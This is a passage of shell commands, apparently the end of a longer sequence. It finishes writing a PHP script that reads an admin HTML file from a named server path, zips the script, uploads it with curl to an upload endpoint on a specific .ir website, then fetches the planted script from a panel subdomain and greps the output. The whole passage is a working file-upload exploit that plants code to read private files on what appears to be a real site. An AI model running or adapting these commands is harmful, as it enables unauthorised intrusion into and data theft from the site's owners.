<?php echo file_get_contents('/home/h417440/panel.silveriom.ir/admin.html'); EOF
zip -r read_admin.zip read_admin.php
curl -s -X POST -F "file=@read_admin.zip" https://silveriom.ir/upload_subdomain.php
curl -s "https://panel.silveriom.ir/read_admin.php" | grep "تیم"